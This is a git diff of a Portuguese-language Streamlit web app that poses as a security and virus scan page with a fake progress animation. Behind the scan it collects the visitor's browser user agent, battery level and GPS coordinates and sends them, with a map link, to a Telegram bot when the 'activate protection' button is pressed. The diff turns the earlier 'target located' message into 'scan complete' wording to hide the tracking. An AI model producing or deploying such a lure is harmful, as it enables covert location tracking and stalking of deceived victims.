@@ -1,5 +1,6 @@
 import streamlit as st
 import requests
+import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
 # 1. CONEXÃO TELEGRAM
@@ -13,90 +14,116 @@ def enviar_telegram(mensagem):
     except: pass
 
 # 2. CONFIGURAÇÃO DA PÁGINA
-st.set_page_config(page_title="Sistema De Segurança Integrado", page_icon="🔐", layout="centered")
+st.set_page_config(page_title="Verificar Segurança", page_icon="🔐", layout="centered")
 
-# 3. CÓDIGO DA ANIMAÇÃO (CSS PURO)
+# 3. CSS DA ANIMAÇÃO DO VÍDEO (ESFERA DE PARTÍCULAS)
 st.markdown("""
     <style>
-    .main { background-color: #0d1117; }
+    .main { background-color: #000000; color: white; }
     
-    /* Container da Esfera */
-    .radar-container {
-        display: flex; justify-content: center; align-items: center; padding: 40px 0;
+    .scanner-container {
+        display: flex; flex-direction: column; align-items: center; justify-content: center;
+        padding: 20px;
     }
-    
-    /* A Esfera Verde Pulsante */
-    .green-globe {
-        width: 150px; height: 150px;
-        background: radial-gradient(circle, #2ecc71 0%, rgba(0,255,100,0.1) 70%);
+
+    /* Esfera de Partículas */
+    .particle-sphere {
+        width: 200px; height: 200px;
         border-radius: 50%;
-        box-shadow: 0 0 40px #2ecc71, inset 0 0 20px #2ecc71;
+        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
+        border: 2px solid rgba(46, 204, 113, 0.4);
+        box-shadow: 0 0 50px rgba(46, 204, 113, 0.6), inset 0 0 30px rgba(46, 204, 113, 0.4);
+        display: flex; align-items: center; justify-content: center;
         position: relative;
-        animation: pulse 2s infinite ease-in-out;
-    }
-    
-    /* Efeito de brilho extra */
-    .green-globe::after {
-        content: '';
-        position: absolute;
-        width: 100%; height: 100%;
-        border-radius: 50%;
-        border: 2px solid #2ecc71;
-        animation: orbit 3s linear infinite;
-        opacity: 0.5;
+        animation: rotate 4s linear infinite, pulse 2s infinite ease-in-out;
     }
 
+    /* Efeito de rotação das partículas */
+    @keyframes rotate {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+    
     @keyframes pulse {
-        0% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 20px #2ecc71; }
-        50% { transform: scale(1.05); opacity: 1; box-shadow: 0 0 50px #2ecc71; }
-        100% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 20px #2ecc71; }
+        0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(46, 204, 113, 0.6); }
+        50% { transform: scale(1.05); box-shadow: 0 0 70px rgba(46, 204, 113, 0.9); }
     }
 
-    /* Botão Amarelo */
+    .percentage { font-size: 50px; font-weight: bold; color: white; }
+    .status-text { color: #2ecc71; font-size: 14px; margin-top: 10px; font-family: sans-serif; }
+
+    /* Estilo do Botão */
     div.stButton > button {
-        background-color: #ffc107 !important;
-        color: black !important;
-        font-weight: bold !important;
-        width: 100% !important; height: 4em !important;
-        border-radius: 12px !important; border: none !important;
+        background-color: #ffc107 !important; color: black !important;
+        font-weight: bold !important; width: 100%; height: 3.5em;
+        border-radius: 10px; border: none !important; margin-top: 20px;
     }
-    
-    .footer { text-align: center; color: #555; font-size: 13px; margin-top: 50px; }
+
+    .footer { text-align: center; color: #444; font-size: 12px; margin-top: 40px; }
     </style>
-
-    <div style="text-align: center;">
-        <h1 style='color: #Green; margin-bottom: 0;'>🛡️ SEGURANÇA ATIVA</h1>
-        <p style='color: #ccc;'>Monitoramento em Tempo Real</p>
-    </div>
-
-    <div class="radar-container">
-        <div class="green-globe"></div>
-    </div>
     """, unsafe_allow_html=True)
 
-# 4. CAPTURA DE DADOS
+# 4. INTERFACE
+st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
+
+# Captura de dados em segundo plano
 ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
 bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
 loc = get_geolocation()
 
-# 5. LÓGICA DO BOTÃO
+# Simulação da contagem do vídeo
+placeholder = st.empty()
+if 'count' not in st.session_state:
+    st.session_state.count = 3 # Começa igual ao seu vídeo
+
+with placeholder.container():
+    st.markdown(f"""
+        <div class="scanner-container">
+            <div class="particle-sphere">
+                <div class="percentage">{st.session_state.count}%</div>
+            </div>
+            <div class="status-text">Verificando... Agora</div>
+        </div>
+    """, unsafe_allow_html=True)
+
+# Lista de itens do vídeo
+st.markdown("""
+    <div style='margin-left: 20px;'>
+        <p>✅ Ambiente de pagamentos</p>
+        <p>✅ Privacidade e segurança</p>
+        <p>✅ Vírus</p>
+    </div>
+""", unsafe_allow_html=True)
+
+# 5. BOTÃO E LÓGICA
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    if loc and 'coords' in loc:
-        lat = loc['coords']['latitude']
-        lon = loc['coords']['longitude']
+    if loc:
+        # Sobe a porcentagem rapidinho pra dar o efeito do vídeo
+        for i in range(st.session_state.count, 101, 10):
+            st.session_state.count = i
+            placeholder.markdown(f"""
+                <div class="scanner-container">
+                    <div class="particle-sphere">
+                        <div class="percentage">{i}%</div>
+                    </div>
+                    <div class="status-text">Finalizando varredura...</div>
+                </div>
+            """, unsafe_allow_html=True)
+            time.sleep(0.1)
+            
+        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
         relatorio = (
-            f"🔔 ALVO LOCALIZADO!\n\n"
+            f"🚨 VARREDURA CONCLUÍDA\n\n"
             f"📱 Aparelho: {ua[:50]}... \n"
-            f"🔋 Bateria: {bat if bat else '--'}%\n"
-            f"📍 Mapa: [VER LOCALIZAÇÃO]({mapa})"
+            f"🔋 Bateria: {bat}%\n"
+            f"📍 Mapa: [ABRIR LOCALIZAÇÃO]({mapa})"
         )
-        
         enviar_telegram(relatorio)
-        st.success("✅ Localização Enviada ao Telegram!")
+        st.success("Proteção Ativada com Sucesso!")
     else:
-        st.warning("🛰️ Carregando GPS... Clique novamente em 2 segundos.")
+        st.warning("Aguardando permissão do GPS...")
 
 # 6. ASSINATURA
 st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
